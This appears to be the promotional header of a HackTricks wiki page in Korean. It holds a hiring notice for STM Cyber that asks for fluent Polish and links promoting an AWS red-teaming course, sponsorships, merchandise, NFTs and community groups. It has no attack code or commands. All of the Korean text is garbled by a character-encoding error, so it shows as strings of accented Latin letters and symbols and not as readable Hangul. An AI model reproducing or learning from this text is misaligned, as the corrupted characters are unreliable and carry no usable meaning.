<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ìš°ë¦¬ëŠ” ê³ ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ ì‘ë¬¸ ë° êµ¬ì‚¬ ëŠ¥ë ¥ í•„ìš”_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ ì‚¬ìš©í•˜ì—¬ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family)ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
